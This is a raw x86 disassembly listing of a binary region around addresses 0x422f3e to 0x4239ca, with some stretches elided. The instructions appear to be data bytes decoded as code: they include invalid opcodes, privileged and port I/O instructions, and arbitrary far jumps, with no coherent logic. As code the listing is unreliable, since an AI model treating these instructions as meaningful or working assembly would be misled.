  422f3e:	pop    ecx
  422f3f:	and    esp,esi
  422f41:	aaa    
  422f42:	clc    
  422f43:	dec    esi
  422f44:	ins    BYTE PTR es:[edi],dx
  422f45:	push   0x6b
  422f47:	pop    edi
  422f48:	cmp    BYTE PTR [ecx+0x5079a540],0x3
  422f4f:	int    0x54
  422f51:	sahf   
  422f52:	sbb    BYTE PTR [ecx+0xb699916],ch
  422f58:	imul   edi,DWORD PTR [ecx-0xc],0xffffffda
  422f5c:	cmp    cl,dl
  422f5e:	iret   
  422f5f:	addr16 clc 
  422f61:	adc    dh,BYTE PTR [ebp+0x28e3208c]
  422f67:	mov    eax,ds:0x222591a3
  422f6c:	push   es
  422f6d:	mov    dl,0x1
  422f6f:	lock aaa 
  422f71:	mov    al,0xaa
  422f73:	int    0x97
  422f75:	pop    esi
  422f76:	mov    ebx,0x6b32a14e
  422f7b:	jle    0x422fd1
  422f7d:	int    0x5f
  422f7f:	sbb    eax,DWORD PTR [esi]
  422f81:	xlat   BYTE PTR ds:[ebx]
  422f82:	in     eax,0xb1
  422f84:	sbb    dh,BYTE PTR [ebx+0x395bab63]
  422f8a:	inc    esp
  422f8b:	push   esi
  422f8c:	scas   al,BYTE PTR es:[edi]
  422f8d:	cmp    al,0x62
  422f8f:	mov    cl,0x57
  422f91:	shl    BYTE PTR [esi+0x42ddfe91],cl
  422f97:	jbe    0x423018
  422f99:	xchg   ebx,eax
  422f9a:	xchg   esi,eax
  422f9b:	mov    bl,BYTE PTR [esi-0x48]
  422f9e:	fcomp  DWORD PTR [ecx+ebp*1-0x14]
  422fa2:	mov    ebx,0xb04e7b79
  422fa7:	fbstp  TBYTE PTR [ebx]
  422fa9:	dec    edx
  422faa:	lods   eax,DWORD PTR ds:[esi]
  422fab:	hlt    
  422fac:	retfw  
  422fae:	in     al,dx
  422faf:	call   0xa99e2ff2
  422fb4:	in     al,0xd
  422fb6:	(bad)  
  422fb7:	hlt    
  422fb8:	lods   eax,DWORD PTR ds:[esi]
  422fb9:	pushf  
  422fba:	int3   
  422fbb:	ins    DWORD PTR es:[edi],dx
  422fbc:	or     DWORD PTR ds:0x38e40ae0,ecx
  422fc2:	fsubrp st(4),st
  422fc4:	sti    
  422fc5:	pop    eax
  422fc6:	or     dl,0x6e
  422fc9:	test   eax,0xf7868431
  422fce:	mov    ah,cl
  422fd0:	fst    DWORD PTR [ecx]
  422fd2:	clc    
  422fd3:	ja     0x42304e
  422fd5:	pop    eax
  422fd6:	pop    eax
  422fd7:	mov    dl,0x65
  422fd9:	or     cl,BYTE PTR [esi]
  422fdb:	add    al,0xa1
  422fdd:	push   eax
  422fde:	jbe    0x422ff9
  422fe0:	(bad)
  422fe4:	fldl2t 
  422fe6:	je     0x422fb7
  422fe8:	push   esp
  422fe9:	adc    bh,BYTE PTR [edx]
  422feb:	sti    
  422fec:	mov    BYTE PTR [edx],al
  422fee:	(bad)  
  422fef:	ja     0x423020
  422ff1:	rcr    DWORD PTR [edx-0x6a5c6419],cl
  422ff7:	leave  
  422ff8:	scas   al,BYTE PTR es:[edi]
  422ff9:	inc    eax
  422ffa:	adc    DWORD PTR [edx+eiz*1+0x6a],ecx
  422ffe:	mov    ds:0xd064295,al
  423003:	push   ebx
  423004:	retf   
  423005:	xor    edx,ecx
  423007:	mov    BYTE PTR ds:0x34ac90c0,dl
  42300d:	sbb    bl,BYTE PTR [edi+ecx*8]
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [eax+edi*2+0x60ec93a4],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	pop    esp
  42308d:	adc    bh,al
  42308f:	enter  0x82df,0x71
  423093:	retf   
  423094:	add    ebx,DWORD PTR [ebx]
  423096:	add    ah,al
  423098:	sbb    al,0x37
  42309a:	ins    BYTE PTR es:[edi],dx
  42309b:	xor    eax,0x9dbe0236
  4230a0:	sbb    DWORD PTR [edx],esi
  4230a2:	mov    dl,0xca
  4230a4:	sub    eax,0xda741d6d
  4230a9:	jbe    0x423092
  4230ab:	cmp    ah,BYTE PTR [ebp+0xa]
  4230ae:	jnp    0x4230d1
  4230b0:	jl     0x42307e
  4230b2:	push   ebx
  4230b3:	leave  
  4230b4:	sti    
  4230b5:	in     eax,dx
  4230b6:	xchg   ebp,eax
  4230b7:	mov    dl,BYTE PTR [ebp+0x5c]
  4230ba:	inc    ebx
  4230bb:	jbe    0x423073
  4230bd:	adc    BYTE PTR [ebp+0x2d],0xea
  4230c1:	mov    eax,ds:0x448ddf85
  4230c6:	dec    edi
  4230c7:	loop   0x4230c5
  4230c9:	pop    esi
  4230ca:	and    al,BYTE PTR [edx+0x48]
  4230cd:	xor    DWORD PTR [esi-0x20],0x543f12e7
  4230d4:	mov    esp,0xff97462a
  4230d9:	lods   eax,DWORD PTR ds:[esi]
  4230da:	retf   0x1f56
  4230dd:	mov    eax,0x9c49532f
  4230e2:	mov    ds:0x8f04a6fd,al
  4230e7:	mov    ds:0xfe517936,eax
  4230ec:	les    esi,FWORD PTR [esp+ebx*4]
  4230ef:	add    DWORD PTR [ebp+0x1adae639],edi
  4230f5:	jl     0x4230f1
  4230f7:	in     eax,0x23
  4230f9:	into   
  4230fa:	sti    
  4230fb:	inc    eax
  4230fc:	sub    al,bl
  4230fe:	ds pop ss
  423100:	icebp  
  423101:	jns    0x4230f9
  423103:	aam    0x57
  423105:	cli    
  423106:	arpl   WORD PTR [ecx],ax
  423108:	scas   al,BYTE PTR es:[edi]
  423109:	pop    ecx
  42310a:	ds xchg ebx,eax
  42310c:	mov    dh,0x1b
  42310e:	outs   dx,BYTE PTR ds:[esi]
  42310f:	icebp  
  423110:	mov    cl,0x4a
  423112:	cmp    eax,0xa22e7643
  423117:	pop    edi
  423118:	cdq    
  423119:	push   eax
  42311a:	inc    ebp
  42311b:	jbe    0x4230b9
  42311d:	scas   al,BYTE PTR es:[edi]
  42311e:	(bad)  
  423120:	mov    WORD PTR [edx+0x26],fs
  423123:	push   edx
  423124:	push   ecx
  423125:	ss pushf 
  423127:	stc    
  423128:	add    al,0x53
  42312a:	mov    bl,0x6
  42312c:	jmp    0x42310a
  42312e:	push   ebp
  42312f:	iret   
  423130:	jmp    0x42317f
  423132:	ret    0x9655
  423135:	aam    0xc8
  423137:	fild   DWORD PTR [ebx+0x2661dd9c]
  42313d:	jl     0x4230e9
  42313f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423140:	sbb    esp,DWORD PTR [esi+0x5935cdb2]
  423146:	sbb    al,0xff
  423148:	inc    ebx
  423149:	sub    edx,esp
  42314b:	popf   
  42314c:	mov    WORD PTR ds:0x996846e6,cs
  423152:	jl     0x423155
  423154:	push   0x57
  423156:	fnsetpm(287 only) 
  423158:	adc    bl,BYTE PTR [esi]
  42315a:	in     eax,0xc1
  42315c:	jo     0x423121
  42315e:	idiv   DWORD PTR ds:0x35b73a18
  423164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423165:	xchg   ebx,eax
  423166:	hlt    
  423167:	mov    ?,eax
  423169:	mov    ds:0x61c7b6fb,eax
  42316e:	jle    0x423110
  423170:	test   ah,al
  423172:	out    dx,eax
  423173:	addr16 jmp 0x46f5:0x825a19ac
  42317b:	push   esp
  42317c:	shl    bh,cl
  42317e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42317f:	or     ebp,DWORD PTR [edi]
  423181:	popf   
  423182:	out    0x40,eax
  423184:	sub    eax,0x601c9edc
  423189:	test   eax,0x5831c16e
  42318e:	pusha  
  42318f:	inc    BYTE PTR [eax]
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x4df3571e],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	and    eax,0x7117fd20
  423211:	pop    ds
  423212:	(bad)  
  423213:	pop    ebp
  423214:	or     eax,0xbbe7a09b
  423219:	pop    ss
  42321a:	dec    esi
  42321b:	pop    esp
  42321c:	or     BYTE PTR ds:[ebp+0x5a4aab5f],bh
  423223:	imul   eax,ebx,0xac13421c
  423229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42322a:	jp     0x4231ce
  42322c:	adc    al,dl
  42322e:	push   edx
  42322f:	ret    0xbbeb
  423232:	fsubr  st,st(7)
  423234:	daa    
  423235:	mov    ebp,cs
  423237:	mov    ch,ah
  423239:	rcl    BYTE PTR [ebx],cl
  42323b:	sti    
  42323c:	lea    ebp,[edi]
  42323e:	dec    eax
  42323f:	xor    BYTE PTR [ebx],ch
  423241:	fst    DWORD PTR ds:0x53d68a0b
  423247:	and    DWORD PTR [edi-0x7ea77af9],edi
  42324d:	addr16 jp 0x423295
  423250:	xlat   BYTE PTR ds:[ebx]
  423251:	mov    eax,ds:0x44f63127
  423256:	and    edi,DWORD PTR [ecx+0x413b7a98]
  42325c:	mov    bh,cl
  42325e:	into   
  42325f:	mov    eax,ds:0x9c754607
  423264:	or     bh,dh
  423266:	dec    ebx
  423267:	xor    al,0xaa
  423269:	fcomip st,st(1)
  42326b:	lahf   
  42326c:	adc    al,0x15
  42326e:	jne    0x4232c6
  423270:	in     al,dx
  423271:	hlt    
  423272:	jnp    0x423275
  423274:	jp     0x423245
  423276:	div    DWORD PTR [eax]
  423278:	and    eax,0x5b29866c
  42327d:	fnsave [ebp+0x3e04c950]
  423283:	mov    bl,0x7b
  423285:	sbb    eax,edi
  423287:	sbb    ecx,esp
  423289:	adc    eax,0xd942c449
  42328e:	repz xor cl,BYTE PTR [edi+0x23c80305]
  423295:	call   0x33fd:0x9ce45e85
  42329c:	or     esi,DWORD PTR [esi]
  42329e:	mov    ah,0xdf
  4232a0:	xchg   ecx,eax
  4232a1:	lea    esi,[ebx]
  4232a3:	adc    eax,0x3eb7f96b
  4232a8:	mov    al,0xe4
  4232aa:	xchg   edx,eax
  4232ab:	aaa    
  4232ac:	pop    ecx
  4232ad:	mov    WORD PTR [esp+eiz*4+0x7a],?
  4232b1:	mov    dl,0x27
  4232b3:	(bad)  
  4232b4:	mov    esi,0xb54d7eea
  4232b9:	popa   
  4232ba:	sbb    eax,0x194200b2
  4232bf:	sub    al,0x93
  4232c1:	jo     0x4232cb
  4232c3:	jb     0x4232a1
  4232c5:	iret   
  4232c6:	mov    esi,0x6ef45e0b
  4232cb:	add    al,0xc5
  4232cd:	push   ds
  4232ce:	(bad)  
  4232cf:	addr16 or eax,0x2f0cde45
  4232d5:	pop    es
  4232d6:	push   eax
  4232d7:	adc    eax,0x9331cb34
  4232dc:	mov    al,0x57
  4232de:	out    0x55,eax
  4232e0:	inc    ebx
  4232e1:	pop    esi
  4232e2:	mov    dh,0xf9
  4232e4:	inc    esi
  4232e5:	or     al,0xbe
  4232e7:	lahf   
  4232e8:	adc    BYTE PTR [eax+eiz*8-0x26e06b7b],dl
  4232ef:	ret    0xf838
  4232f2:	cmp    dl,cl
  4232f4:	inc    ebp
  4232f5:	or     al,0xb3
  4232f7:	pop    eax
  4232f8:	icebp  
  4232f9:	mov    ds:0xaa007dff,eax
  4232fe:	push   0x6e
  423300:	and    eax,0x89b05763
  423305:	call   0x4247:0x3c8f8f4c
  42330c:	or     al,0xe9
  42330e:	inc    esi
  42330f:	add    BYTE PTR cs:[eax],al
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x3a4d0f44
  423382:	leave  
  423383:	pop    es
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [ecx-0x4b08809e],ch
  423391:	aam    0x9c
  423393:	add    eax,0x81be0c3d
  423398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423399:	imul   DWORD PTR [edi]
  42339b:	fnsave [ebx]
  42339d:	lock xchg edi,eax
  42339f:	arpl   WORD PTR [ebx-0x42c70ccd],di
  4233a5:	inc    edx
  4233a6:	adc    eax,0xefdc3b4d
  4233ab:	cli    
  4233ac:	sahf   
  4233ad:	enter  0xf6f8,0x36
  4233b1:	jno    0x423344
  4233b3:	jbe    0x423409
  4233b5:	mov    bl,BYTE PTR [ebp-0x53f39c5]
  4233bb:	xor    bl,BYTE PTR [edx]
  4233bd:	sub    ch,BYTE PTR [edx-0x6e]
  4233c0:	xor    esi,DWORD PTR [ebp-0x6]
  4233c3:	das    
  4233c4:	aaa    
  4233c5:	in     al,0xb9
  4233c7:	aaa    
  4233c8:	jno    0x4233c7
  4233ca:	out    dx,al
  4233cb:	dec    edi
  4233cc:	repz jnp 0x4233bd
  4233cf:	das    
  4233d0:	dec    esp
  4233d1:	inc    ebx
  4233d2:	sti    
  4233d3:	lods   eax,DWORD PTR ds:[esi]
  4233d4:	dec    ebx
  4233d5:	aad    0xcd
  4233d7:	pop    es
  4233d8:	mov    ecx,0xa31d7e30
  4233dd:	inc    esp
  4233de:	jnp    0x423446
  4233e0:	add    ax,0x6bd7
  4233e4:	ror    BYTE PTR [ecx-0x31],0xb6
  4233e8:	add    DWORD PTR ds:0xe296a4f3,esp
  4233ee:	mov    BYTE PTR [ecx+ebp*8],ah
  4233f1:	stos   BYTE PTR es:[edi],al
  4233f2:	les    esp,FWORD PTR [esi+0x294d8d]
  4233f8:	sub    eax,0xa8dcfbd5
  4233fd:	mov    ds:0xdeb06ab0,al
  423402:	and    DWORD PTR [edx+esi*8-0x672e2a7b],edi
  423409:	int    0x8b
  42340b:	lods   eax,DWORD PTR ds:[esi]
  42340c:	sbb    eax,0xdd458761
  423411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423412:	mov    esi,0xfd644502
  423417:	mov    cl,0x18
  423419:	cdq    
  42341a:	es stc 
  42341c:	mov    eax,0xa6c5611c
  423421:	fs loop 0x423403
  423424:	jno    0x423460
  423426:	jecxz  0x423453
  423428:	jmp    0xeba724e9
  42342d:	add    DWORD PTR [ebp-0x4803b9b7],ebp
  423433:	sbb    eax,DWORD PTR [eax]
  423435:	dec    ebp
  423436:	aad    0x25
  423438:	pusha  
  423439:	push   cs
  42343a:	cli    
  42343b:	fisub  WORD PTR [ebp+0x3e]
  42343e:	stos   BYTE PTR es:[edi],al
  42343f:	sbb    BYTE PTR cs:[eax],cl
  423442:	push   ebp
  423443:	lea    esp,[esi+0x8]
  423446:	mov    bh,0x24
  423448:	repnz or BYTE PTR [eax+eiz*4],bl
  42344c:	call   0xcb0f6827
  423451:	push   ss
  423452:	scas   al,BYTE PTR es:[edi]
  423453:	lock call 0xb6277009
  423459:	sbb    eax,0x3940edd8
  42345e:	mov    ah,BYTE PTR ds:0x711d959c
  423464:	xchg   ecx,eax
  423465:	test   bl,ah
  423467:	div    DWORD PTR [edx-0x68]
  42346a:	mov    ebx,0xd8edfccd
  42346f:	data16 mov dl,0x9f
  423472:	imul   edx,edi,0xffffffaa
  423475:	stc    
  423476:	push   edx
  423477:	fucomip st,st(0)
  423479:	push   edi
  42347a:	fcom   DWORD PTR [ecx+0x5624f596]
  423480:	inc    edi
  423481:	je     0x423419
  423483:	mov    al,ds:0xb4b460b1
  423488:	xchg   ebp,eax
  423489:	xor    eax,0x1c089927
  42348e:	cmp    al,0xd5
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	std    
  423501:	ss push edx
  423503:	aas    
  423504:	ins    BYTE PTR es:[edi],dx
  423505:	js     0x423508
  423507:	add    BYTE PTR [ecx+eax*1],al
  42350a:	add    BYTE PTR [eax],al
  42350c:	sar    BYTE PTR [ebp+0x13910117],1
  423512:	cmp    al,0x4f
  423514:	mov    DWORD PTR [esi-0x68],edx
  423517:	pop    ecx
  423518:	pop    esi
  423519:	adc    bl,al
  42351b:	or     DWORD PTR [eax+0x73],ecx
  42351e:	xchg   BYTE PTR [ecx+0x72],cl
  423521:	fs ja  0x423582
  423524:	out    dx,al
  423525:	jmp    0x6266:0x3b8d9bbb
  42352c:	test   al,0xb8
  42352e:	lahf   
  42352f:	sbb    DWORD PTR [ebx],ebp
  423531:	pop    eax
  423532:	push   edi
  423533:	xchg   ebx,eax
  423534:	das    
  423535:	lods   al,BYTE PTR ds:[esi]
  423536:	push   esp
  423537:	xlat   BYTE PTR ds:[ebx]
  423538:	inc    eax
  423539:	call   DWORD PTR [edi]
  42353b:	out    0xf7,eax
  42353d:	jl     0x423506
  42353f:	int    0x6d
  423541:	sti    
  423542:	imul   edx,DWORD PTR [esi],0xf124648c
  423548:	or     ebp,DWORD PTR [ebx-0x5b7434f8]
  42354e:	stc    
  42354f:	cmp    ebp,edi
  423551:	js     0x423534
  423553:	push   es
  423554:	sbb    ch,cl
  423556:	cdq    
  423557:	dec    ebx
  423558:	sbb    al,0x6d
  42355a:	sbb    BYTE PTR [ecx-0x19],dh
  42355d:	sti    
  42355e:	ror    bh,1
  423560:	mov    WORD PTR [edi],es
  423562:	add    ebp,DWORD PTR ds:0xaffaa9d9
  423568:	push   ebx
  423569:	test   bh,0x44
  42356c:	sbb    eax,0xcd25c893
  423571:	mov    ch,0x68
  423573:	aaa    
  423574:	shr    DWORD PTR [ebx+ebx*8-0x2b],0xba
  423579:	mov    ebp,0x6f2ec26b
  42357e:	sub    dh,dl
  423580:	adc    eax,0xb601c9b5
  423585:	ret    0xcb0d
  423588:	inc    esi
  423589:	xchg   esp,eax
  42358a:	xor    ch,dh
  42358c:	out    0xb,al
  42358e:	repz fwait
  423590:	pop    esi
  423591:	mov    ds:0x2369acb7,al
  423596:	(bad)  
  423598:	xchg   BYTE PTR ds:0x5656bf7c,ch
  42359e:	xchg   edi,eax
  42359f:	xchg   DWORD PTR [edx],esi
  4235a1:	(bad)  
  4235a3:	mov    bl,0x11
  4235a5:	push   edx
  4235a6:	add    eax,0x64c914c7
  4235ab:	sub    eax,ebp
  4235ad:	fs push cs
  4235af:	in     eax,0x55
  4235b1:	or     edi,DWORD PTR [eax]
  4235b3:	pop    esi
  4235b4:	mov    edi,0x43f53500
  4235b9:	jno    0x423608
  4235bb:	leave  
  4235bc:	mov    ds:0x9c22ec28,al
  4235c1:	mov    ch,0x89
  4235c3:	pop    ecx
  4235c4:	iret   
  4235c5:	jle    0x4235a7
  4235c7:	add    DWORD PTR [ecx+0x6e],0x31
  4235cb:	cli    
  4235cc:	ret    
  4235cd:	cld    
  4235ce:	out    0x43,al
  4235d0:	jno    0x423601
  4235d2:	stos   BYTE PTR es:[edi],al
  4235d3:	push   0xffffffad
  4235d5:	hlt    
  4235d6:	inc    ebx
  4235d7:	jo     0x423637
  4235d9:	inc    edx
  4235da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235db:	ds dec esp
  4235dd:	mov    BYTE PTR [eax],ah
  4235df:	mov    al,ds:0x54c75b65
  4235e4:	push   esp
  4235e5:	sub    esi,eax
  4235e7:	and    al,0x22
  4235e9:	(bad)  
  4235ea:	in     al,dx
  4235eb:	test   DWORD PTR [edi+0x57],edi
  4235ee:	jnp    0x42362d
  4235f0:	pop    es
  4235f1:	sub    dl,BYTE PTR [eax-0x2ad4ea80]
  4235f7:	or     al,0x4d
  4235f9:	dec    edi
  4235fa:	mov    ah,0x74
  4235fc:	inc    ebx
  4235fd:	cmp    cl,dl
  4235ff:	or     al,0x68
  423601:	mov    ds:0x7b72f98,al
  423606:	nop
  423607:	cmp    bl,BYTE PTR [eax+0x1a814a9]
  42360d:	jg     0x4235e4
  42360f:	push   edi
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	call   FWORD PTR [ebx+0x7970fc10]
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	pop    ecx
  42368d:	push   esi
  42368e:	aas    
  42368f:	call   0x4c58:0x1f060534
  423696:	xchg   esi,eax
  423697:	push   ebx
  423698:	mov    WORD PTR [ebx+0x6b8ffa1c],gs
  42369e:	(bad)  
  42369f:	lods   al,BYTE PTR ds:[esi]
  4236a0:	xor    eax,0xe9014eea
  4236a5:	scas   al,BYTE PTR es:[edi]
  4236a6:	ret    
  4236a7:	mov    esp,0x6ab1e081
  4236ac:	int3   
  4236ad:	in     al,dx
  4236ae:	mov    edi,?
  4236b0:	adc    edi,esp
  4236b2:	fistp  QWORD PTR [edx+eax*2-0x3b564b70]
  4236b9:	rol    DWORD PTR [ebp-0x2594b409],1
  4236bf:	pop    es
  4236c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236c1:	jnp    0x4236ae
  4236c3:	pop    ebp
  4236c4:	xchg   edx,eax
  4236c5:	and    BYTE PTR [ecx+0x6fb40089],0x86
  4236cc:	clc    
  4236cd:	jne    0x423663
  4236cf:	sbb    WORD PTR [edx+0x4200dfeb],ax
  4236d6:	jo     0x423706
  4236d8:	sbb    esp,ebx
  4236da:	popa   
  4236db:	sbb    DWORD PTR [ecx],eax
  4236dd:	nop
  4236de:	mov    bl,0x33
  4236e0:	xchg   esi,eax
  4236e1:	rcl    BYTE PTR [edx+eax*8],0xe8
  4236e5:	mov    al,0xc5
  4236e7:	pop    ss
  4236e8:	(bad)  
  4236e9:	jno    0x423768
  4236eb:	jo     0x42366f
  4236ed:	push   eax
  4236ee:	loop   0x42369e
  4236f0:	or     ch,BYTE PTR [eax]
  4236f2:	sub    DWORD PTR [ebx],eax
  4236f4:	icebp  
  4236f5:	mov    bl,BYTE PTR [ebx+ecx*8-0x6a]
  4236f9:	(bad)  
  4236fa:	jne    0x423776
  4236fc:	push   ebp
  4236fd:	(bad)  
  4236ff:	inc    edi
  423700:	mov    DWORD PTR [esi],esp
  423702:	mov    al,0x6d
  423704:	stos   DWORD PTR es:[edi],eax
  423705:	sbb    dh,BYTE PTR [edx-0x2b]
  423708:	lahf   
  423709:	add    BYTE PTR es:0x28d73499,al
  423710:	jbe    0x42377b
  423712:	rcr    al,1
  423714:	inc    ebp
  423715:	dec    esi
  423716:	imul   DWORD PTR ds:0x1b524c06
  42371c:	dec    esi
  42371e:	pop    eax
  42371f:	adc    cl,al
  423721:	cmp    ebx,0x35b47ee6
  423727:	cmp    al,0xdd
  423729:	cmc    
  42372a:	repz ret 
  42372c:	sahf   
  42372d:	push   eax
  42372e:	mov    esi,ecx
  423730:	dec    edx
  423731:	aad    0x3d
  423733:	adc    al,0xc
  423735:	or     eax,0x2f008da8
  42373a:	ret    0xb161
  42373d:	pusha  
  42373e:	jmp    DWORD PTR [ecx-0x5c]
  423741:	stos   DWORD PTR es:[edi],eax
  423742:	push   DWORD PTR [edi-0x1669b74f]
  423748:	sub    BYTE PTR [esi],dh
  42374a:	and    DWORD PTR [ecx],edi
  42374c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42374d:	push   ebp
  42374e:	xor    ch,BYTE PTR [edi+0x5c8b03d3]
  423754:	pop    ecx
  423755:	jecxz  0x42378c
  423757:	push   ss
  423758:	sbb    eax,0x3df92968
  42375d:	inc    edx
  42375e:	mov    ecx,0xf689bd76
  423763:	push   esp
  423764:	and    ch,cl
  423766:	in     al,0x53
  423768:	push   ecx
  423769:	jne    0x4237e3
  42376b:	call   0x2cb1:0xa406be2a
  423772:	push   ebp
  423773:	and    bh,BYTE PTR [edi]
  423775:	dec    edi
  423776:	pop    ss
  423777:	inc    esp
  423778:	adc    ebp,DWORD PTR [esp+eiz*4-0x4d]
  42377c:	sub    cl,BYTE PTR [eax+0x3deeae3f]
  423782:	jb     0x4237cb
  423784:	jp     0x423770
  423786:	jg     0x423774
  423788:	xchg   edi,eax
  423789:	pop    es
  42378a:	test   eax,0xc887738b
  42378f:	push   ds
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x8427b4e7
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	mov    ch,0x38
  42380e:	cdq    
  42380f:	cdq    
  423810:	cmp    esp,DWORD PTR [ebp+0x7b7dfff9]
  423816:	xchg   DWORD PTR [ebx+0x705fb4bb],edi
  42381c:	mov    ebx,0x5959927a
  423821:	add    dl,BYTE PTR [esi+0x5e]
  423824:	dec    edi
  423825:	test   eax,0xa5fe5ad6
  42382a:	xchg   DWORD PTR [esi+ebx*4-0x4d],edi
  42382e:	cli    
  42382f:	jge    0x42383c
  423831:	xchg   ecx,eax
  423832:	mov    ch,0x6f
  423834:	sbb    edx,DWORD PTR [ecx-0x5]
  423837:	xchg   ebp,eax
  423838:	cmp    al,BYTE PTR [ebx]
  42383a:	inc    eax
  42383b:	call   0x7805:0x7a7a9900
  423842:	std    
  423843:	cmp    DWORD PTR [ecx+0x58],esi
  423846:	ss dec eax
  423848:	and    dl,bh
  42384a:	or     al,0x3b
  42384c:	fcomp  DWORD PTR [ebp+0x41]
  42384f:	and    DWORD PTR [ebx],edx
  423851:	les    esi,FWORD PTR [ecx-0x28]
  423854:	cdq    
  423855:	cmp    al,0x43
  423857:	ss push ecx
  423859:	mov    esp,0x9840d3b6
  42385e:	adc    BYTE PTR [esi-0x10],bh
  423861:	pop    ds
  423862:	jmp    0x5a4b:0xfb888b09
  423869:	loop   0x4238a4
  42386b:	xchg   esi,eax
  42386c:	dec    ecx
  42386d:	call   0xae150bc2
  423872:	int3   
  423873:	lods   al,BYTE PTR ds:[esi]
  423874:	sahf   
  423875:	and    dl,BYTE PTR [edi+0x77467c7d]
  42387b:	xor    BYTE PTR [ebx],dl
  42387d:	pop    ss
  42387e:	jae    0x4238c7
  423880:	sub    BYTE PTR [edx-0x24c84fcb],0x14
  423887:	jnp    0x423823
  423889:	fisub  WORD PTR [edx-0x1dac1e8b]
  42388f:	mov    edi,0x46caebe0
  423894:	add    DWORD PTR ds:[edi*8+0x680f5567],edx
  42389c:	lds    edi,FWORD PTR [edi]
  42389e:	loope  0x42391f
  4238a0:	add    cl,cl
  4238a2:	xchg   esi,eax
  4238a3:	mov    ds:0xf5bbda5e,al
  4238a8:	mov    cl,0x47
  4238aa:	cmp    dl,dh
  4238ac:	(bad)  
  4238ad:	shr    BYTE PTR [edx-0x69],cl
  4238b0:	cs push es
  4238b2:	das    
  4238b3:	cs pop eax
  4238b5:	sbb    dl,BYTE PTR [ebx-0x6e]
  4238b8:	jns    0x4238e5
  4238ba:	mov    eax,ds:0x9ad41e09
  4238bf:	inc    esp
  4238c0:	pop    eax
  4238c1:	xchg   edi,eax
  4238c2:	ss out dx,al
  4238c4:	cmp    edx,ebp
  4238c6:	neg    BYTE PTR [eax-0x2]
  4238c9:	aas    
  4238ca:	les    eax,FWORD PTR [edx-0x7e]
  4238cd:	push   ecx
  4238ce:	mov    esp,DWORD PTR [esi-0x8cd36e0]
  4238d4:	in     eax,dx
  4238d5:	ja     0x42389b
  4238d7:	xor    eax,0xa7a76699
  4238dc:	jmp    0x423870
  4238de:	adc    al,0x89
  4238e0:	cmp    al,0xe1
  4238e2:	lods   al,BYTE PTR ds:[esi]
  4238e3:	test   BYTE PTR [edx-0x16],dl
  4238e6:	bound  esi,QWORD PTR [ecx]
  4238e8:	add    BYTE PTR [edx+0x6e],dl
  4238eb:	call   0xdc9f:0x6f20029c
  4238f2:	repnz add esi,DWORD PTR [esp+ecx*8+0x13]
  4238f7:	ss (bad) 
  4238f9:	popf   
  4238fa:	popf   
  4238fb:	or     eax,0x7c13475f
  423900:	add    bl,0x8b
  423903:	pop    ss
  423904:	call   0x191c:0x2b631535
  42390b:	mov    al,0x8c
  42390d:	dec    ebp
  42390e:	(bad)  
  42390f:	add    eax,0x0
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x5cc72bbd
  423982:	push   0x21
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	lods   eax,DWORD PTR ds:[esi]
  42398d:	inc    ebx
  42398e:	pop    ebx
  42398f:	sbb    al,0xe6
  423991:	push   edi
  423992:	je     0x423915
  423994:	test   al,0xd5
  423996:	cmc    
  423997:	in     al,0xa9
  423999:	ins    DWORD PTR es:[edi],dx
  42399a:	mov    ebp,0x7938f4f1
  42399f:	pop    ds
  4239a0:	mov    ds:0x4726833a,eax
  4239a5:	or     cl,BYTE PTR [eax]
  4239a7:	lahf   
  4239a8:	and    DWORD PTR [esi-0x18c6dd53],ebx
  4239ae:	bound  edx,QWORD PTR [ebx+edi*8-0x32]
  4239b2:	scas   eax,DWORD PTR es:[edi]
  4239b3:	cmp    eax,0xbeaf8bf3
  4239b8:	mov    ch,0xbb
  4239ba:	ins    BYTE PTR es:[edi],dx
  4239bb:	inc    edi
  4239bc:	je     0x423a02
  4239be:	mov    bh,0xd2
  4239c0:	pop    ebp
  4239c1:	xor    al,0x20
  4239c3:	mov    eax,ds:0x164a17a1
  4239c8:	and    cl,BYTE PTR [esi]
  4239ca:	xor    dl,BYTE PTR [ebp+esi*2-0x4]
